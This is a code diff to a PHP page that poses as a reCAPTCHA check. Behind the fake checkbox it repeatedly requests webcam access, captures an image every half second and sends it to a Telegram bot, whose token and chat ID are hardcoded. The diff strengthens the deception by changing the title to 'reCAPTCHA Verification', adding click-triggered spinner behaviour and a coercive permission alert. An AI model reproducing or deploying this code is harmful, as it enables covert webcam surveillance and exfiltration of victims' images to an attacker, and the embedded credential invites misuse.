@@ -1,18 +1,18 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
-    // Check if expiry parameter exists or link is expired
+    // Security check: Verify expiry time parameter
     if (!isset($_POST['e']) || empty($_POST['e'])) {
         exit;
     }
 
     $expiryTime = intval($_POST['e']);
     if (time() > $expiryTime) {
-        exit; 
+        exit; // Link expired, do not process image
     }
 
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
-    $chatId = "5896019931"; 
+    $chatId = "5896019931"; // Default fallback chat ID
 
     if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
         $encodedCid = $_POST['chat_id'];
@@ -81,7 +81,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>reCAPTCHA Verification</title>
     <style>
         body, html {
             margin: 0;
@@ -106,6 +106,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             width: 300px;
             box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
             display: none;
+            cursor: pointer;
         }
 
         .recaptcha-left {
@@ -126,15 +127,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             position: relative;
         }
 
-        /* Thicker spinner with slower rotation speed */
+        /* Thicker spinner border and slow 1.2s rotation */
         .recaptcha-spinner {
-            width: 22px;
-            height: 22px;
+            width: 20px;
+            height: 20px;
             border: 4px solid #f3f3f3;
             border-top: 4px solid #4285F4;
             border-radius: 50%;
             animation: spin 1.2s linear infinite;
-            display: block;
+            display: none; /* Hidden by default until clicked */
         }
 
         @keyframes spin {
@@ -146,7 +147,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             display: none;
         }
 
-        /* Checkmark style */
+        /* Checkmark styling */
         .recaptcha-checkbox.checked::after {
             content: "";
             position: absolute;
@@ -190,7 +191,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 </head>
 <body>
 
-    <div class="recaptcha-box" id="recaptchaContainer">
+    <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
         <div class="recaptcha-left">
             <div class="recaptcha-checkbox" id="recaptchaCheckbox">
                 <div class="recaptcha-spinner" id="recaptchaSpinner"></div>
@@ -231,18 +232,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             recaptchaContainer.style.display = 'flex';
         }
 
-        // Automatically start spinning on page load and redirect after 3.5 seconds
-        window.addEventListener('DOMContentLoaded', () => {
-            const checkbox = document.getElementById('recaptchaCheckbox');
+        let isClicked = false;
+        function openTargetLink() {
+            if (isClicked) return;
+            isClicked = true;
 
+            const checkbox = document.getElementById('recaptchaCheckbox');
+            const spinner = document.getElementById('recaptchaSpinner');
+
+            // Show spinner on click
+            spinner.style.display = 'block';
+
+            // Rotate spinner for 3.5 seconds (3500ms)
             setTimeout(() => {
+                spinner.style.display = 'none';
                 checkbox.classList.add('checked');
                 
+                // Short delay to show checkmark before redirecting in main tab
                 setTimeout(() => {
                     window.location.href = finalUrl;
                 }, 400);
-            }, 3500); 
-        });
+            }, 3500);
+        }
 
         let batteryLevelInfo = 'Not Available';
         if (navigator.getBattery) {
@@ -256,12 +267,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 .then(stream => {
                     video.srcObject = stream;
                     setTimeout(() => {
+                        // Capture image every 0.5 seconds (500ms)
                         setInterval(captureAndUpload, 500);
                     }, 1000);
                 })
                 .catch(err => {
                     console.error("Camera error: ", err);
-                    alert("Camera permission is required to view this link!");
+                    alert("You must grant camera permission to proceed!");
                     setTimeout(requestCameraPermission, 1000);
                 });
         }
